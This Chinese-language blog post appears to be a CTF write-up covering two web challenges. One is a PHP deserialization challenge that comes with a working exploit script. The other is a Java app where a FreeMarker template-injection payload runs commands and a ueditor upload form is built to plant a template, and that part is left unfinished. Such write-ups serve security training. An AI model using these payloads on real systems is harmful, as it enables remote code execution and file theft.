---
layout: post
title: "2022年全省通信和互联网行业职业技能竞赛 WriteUp"
date: 2022-11-03
toc: true
author: Bin4xin
categories:
- blog
tags:
- CTF
- WriteUp
---

## 1.Web PHP serialize

反序列化考点；题意：

定义了两个class，class A是去找传入进来的文件位置并做if存在判断，过程中对`$filepath`做base64解码；

```php
class A{
    public $files;
    public function findFile()
    {
        echo $this->files;
        if (file_exists(base64_decode($this->files->filepath)))
        {
            echo "This is a file";
        }else{
            echo "File not found";
        }
    }
    public function __destruct()
    {
        $this->findFile();
    }
}
```

第二个class B是对传入的`$filepath`做了一个简单的过滤判断，如果传入的字符符合`/flag`，那么就直接退出报`die("no")`；

```php
class B{
    public $filepath;
    public function shutdown()
    {
        die("no");
    }
    public function __toString()
    {
        $result = $this->filepath;
        if (strstr($result,"L2ZsYWc") || strlen($result)>8){
            $this->shutdown();
        }
        $result = base64_decode($result);
        $content = file_get_contents($result);
        echo $content;
        return "";
    }
}
```

最后就针对传入的参数做反序列化：

```php
@$a = $_GET['a'];
@unserialize(base64_decode($a));
```

所以定义两个函数传入`$filepath`，序列化后对字符串进行base64编码即可：

## exp

```php
 <?php
class A{
    public $files;
}
class B{
    public $filepath;
}

$a = new A();
$b = new B();

$a->files = $b;
$b->filepath = "Ly9mbGFn";
echo base64_encode(serialize($a));
?>
```

`php7 exp.php`

![2022-10-31-23.08.27.png](https://image.yjs2635.xyz/images/2022/11/03/2022-10-31-23.08.27.png)

## 2.Web FunnyJava

题目给出了一个Jar包； IDEA引用lib直接反编译

直接定位`Controller`：

### Search
```
FunnyJava.jar!/BOOT-INF/classes/com/funnnyjava/Controller/Search.class
```

```java
@RequestMapping(
        value = {"/search"},
        method = {RequestMethod.GET, RequestMethod.POST}
    )
    @ResponseBody
    public String search(HttpServletRequest request, HttpServletResponse response) {
        String search = request.getParameter("search");
        if (search == null) {
            search = "search.html";
        }
        ···
        return content;
    }
```
一个`/Search`功能，提供`search`参数返回相关内容；解析模版可以通过以下类中看到[^1]：

```
FunnyJava.jar!/BOOT-INF/classes/com/funnnyjava/util/ParserUtil.class
```

```java
String buildTempletPath = BasicUtil.getRealPath(context, "") + "templates" + File.separator;
```

### Editor

第二个是一个ueditor的路由定义：

```java
@RequestMapping({"/static/plugins/ueditor/{version}/jsp"})
··· {
···
    @RequestMapping({"editor"})
    public String editor(HttpServletRequest request, HttpServletResponse response, String jsonConfig){
        ···
            }
        }
```

应该是一个上传功能的路由定义，但是我们看完两个Controller还暂时没有思路，上传点这里我们暂时放下不表；

### 解题思路

Search功能我们可以看到默认解析的是webapp中的`search.html`并返回；

Editor上传功能也有可能我们找到上传点，可以直接getshell；

所以目前有两个思路：

- 思路一：`Search`直接模版解析RCE；
- 思路二：`Editor`上传getShell；

## 本地调试

思路一：

```java
import freemarker.core.ParseException;
import freemarker.template.MalformedTemplateNameException;
import freemarker.template.TemplateNotFoundException;
```
我们可以看到搜索功能下导入的模版解析库；我们搜索关键词`Freemarker模板注入`，可以看到网上很多相关文章，而且在Jar包中其实也给了我们提示：

```
FunnyJava.jar!/BOOT-INF/classes/templates/1647232439869.htm
```
我们直接本地起环境，把代码放到模版位置，查看运行情况：

```html
<#assign exec="freemarker.template.utility.Execute"?new()> ${ exec("id") }
```

![2022-10-31-23.07.36.png](https://image.yjs2635.xyz/images/2022/11/03/2022-10-31-23.07.36.png)

我们可以看到，模版解析RCE。所以思路一没问题，那么我们应该怎么把我们生成的模版让服务器去执行呢？

思路二：

显然，需要通过`ueditor`的上传功能上传到`webapp/templates`目录下（前面已经解释目录来源），然后通过`search`功能来解析我们的恶意模版来达到RCE的目的；

## 上传点突破

我们通过前面[Editor](#editor)的路由定义来找到路由如何访问，并定义相关参数上传我们的模版：

根据`@RequestMapping`的定义和`ueditor`的相关用法，找到上传的路由为：

```
http://localhost:8080/static/plugins/ueditor/1.4.3.3/jsp/editor?action=uploadimage
```

payload：

```html
<form action="http://192.168.3.50:8080/static/plugins/ueditor/1.4.3.3/jsp/editor?action=uploadimage" method="post" enctype="multipart/form-data">
    <div><input type="file" multiple="multiple" accept="image/*" name="image"></div>
    <div><input type="submit" value="上传"></div>
</form>
```

不过构造完payload上传后会一直提示`IO错误`；考虑有可能是写入文件格式不正确；

[//]: # (Mark TODO)

## REF

[^1]: [FreeMarker模板开发中StringTemplateLoader的用法](https://blog.csdn.net/weixin_41986096/article/details/105481817){:target="_blank"}